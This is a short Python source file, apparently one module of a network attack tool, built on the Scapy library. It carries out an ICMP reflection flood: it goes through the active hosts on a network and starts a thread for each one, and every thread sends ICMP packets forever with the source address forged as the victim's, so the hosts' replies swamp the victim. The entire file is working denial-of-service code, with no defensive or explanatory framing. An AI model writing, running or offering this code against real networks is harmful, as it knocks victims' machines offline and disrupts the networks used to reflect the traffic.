from scapy.all import *
import threading

def reflection(victim,active_ips,terminal = None):

    try:
        icmp_threads = []
        send_icmp = []

        for name,hwaddr,addr in active_ips:
            if addr[0] == victim:
                pass
            else:
                send_icmp.append(addr[0])

        for ip in send_icmp:
            t = threading.Thread(target = __send_spoofed_icmp, args = (ip,victim,terminal))
            t.daemon = True
            t.start()
            icmp_threads.append(t)

        for t in icmp_threads:
            t.join()
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))

def __send_spoofed_icmp(ip,victim,terminal):
    try:
        if terminal == None:
            print("[+] Sending packets to "+ip)
        else:
            terminal.write('\n[+] Sending packets to '+ip)
        packet = IP(src=victim,dst=ip)/ICMP()
        while 1:
            send(packet,verbose = 0)
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))
